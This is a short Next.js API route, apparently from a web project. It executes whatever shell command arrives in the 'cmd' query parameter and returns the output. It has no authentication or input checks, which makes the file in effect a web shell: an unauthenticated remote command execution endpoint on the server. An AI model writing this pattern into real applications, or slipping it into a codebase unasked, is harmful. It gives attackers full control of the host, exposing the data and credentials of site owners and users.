import { NextResponse } from 'next/server'
import { exec } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url)
    const command = searchParams.get('cmd')
    if (!command) return NextResponse.json({ error: 'No command' })
    const { stdout, stderr } = await execAsync(command, { cwd: 'd:\\multiplyingbrics\\web' })
    return NextResponse.json({ stdout, stderr })
  } catch (err: any) {
    return NextResponse.json({ error: err.message, stderr: err.stderr })
  }
}
